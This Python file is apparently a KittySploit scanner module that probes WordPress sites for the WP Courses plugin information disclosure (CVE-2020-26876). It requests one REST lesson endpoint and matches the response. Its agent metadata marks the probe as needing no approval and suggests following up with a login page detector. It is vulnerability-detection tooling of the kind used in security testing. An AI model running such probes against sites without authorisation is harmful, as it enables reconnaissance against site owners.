#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress WP Courses Plugin < 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress WP Courses Plugin Information Disclosure Detection',
        'description': 'WordPress WP Courses Plugin < 2.0.29 contains a critical information disclosure which exposes private course videos and materials.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'wordpress', 'wp-plugin', 'exposure', 'edb', 'wpcoursesplugin', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2020-26876',
            'https://www.exploit-db.com/exploits/48910',
            'https://www.redtimmy.com/critical-information-disclosure-on-wp-courses-plugin-exposes-private-course-videos-and-materials/',
            'https://plugins.trac.wordpress.org/changeset/2388997',
            'https://plugins.trac.wordpress.org/changeset/2389243',
        ],
        'cve': 'CVE-2020-26876',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-json/wp/v2/lesson/1', allow_redirects=False)
        if not r or r.status_code not in (200, 404):
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/json',)
        body_regexes = ('rest_post_invalid_id', '"(guid|title|content|excerpt)":{"rendered":',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="WordPress WP Courses Plugin Information Disclosure detected",
                path='/wp-json/wp/v2/lesson/1',
            )
            return True
        return False

